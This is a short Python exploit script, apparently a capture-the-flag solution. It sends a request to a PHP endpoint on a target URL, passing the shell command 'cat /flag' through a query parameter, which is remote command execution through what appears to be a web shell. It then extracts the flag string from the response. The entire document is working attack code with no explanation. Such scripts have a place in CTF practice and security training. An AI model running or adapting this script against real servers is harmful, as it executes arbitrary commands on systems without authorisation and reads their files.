from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import get
        from re import findall

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }

        payload = 'xk0SzyKwfzw.php?Efa5BVG=cat%20/flag'
        flag = get(url=url+payload, headers=headers).text

        flag = findall('flag{.*?}', flag)

        print("".join(flag))
